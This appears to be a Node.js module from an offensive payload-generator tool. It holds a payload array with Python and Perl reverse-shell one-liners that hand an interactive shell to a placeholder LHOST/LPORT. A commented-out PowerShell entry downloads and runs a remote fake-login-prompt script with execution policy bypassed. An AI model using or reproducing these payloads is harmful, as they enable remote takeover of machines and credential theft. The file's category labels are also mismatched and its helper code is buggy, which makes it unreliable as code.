var prompt = require('prompt');
// Payload Array
arrayScripting = []

// title, description, payload, category, and callback (optional: used for additional options if needed)
$1={
	title: "Tools", 
	description: "A reverse shell one liner written in python",
	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$LHOST$$\",$$LPORT$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
	category: "Ruby",
	callback: function(returnToPrepare){
		prompt.message = "Press any key to return :"
		prompt.get([{name: 'printConfigMEnu', description: ':'}], function(){
			returnToPrepare()
		})
	}
}

$2={
	title: "Tools",
	description: "A reverse shell one liner written in perl",
	payload: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
	category: "Python",
	callback: ""
}

// arrayScripting.push({
// 	title: "Use powershell to download and execute a larger powershell payload", 
// 	payload: "powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('$$RHOST$$')); Invoke-LoginPrompt",
// 	sample: "powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('"+yellow("$$RHOST$$")")); Invoke-LoginPrompt\n Ex RHOST:https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1"),
// 	category: "DNS"
// })




arrayScripting.push($1,$2)

var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayScripting,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayScripting.length;i++){
			if (arrayScripting[i].category === value){
				tempArray.push(arrayScripting[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayScripting.length;i++){
			if(unique[arrayScripting[i].category]){

			}
			else {
				unique[arrayScripting[i].category] = true;
				uniqueCategories.push(arrayScripting[i].category)
			} 
		return uniqueCategories
		}
	}
}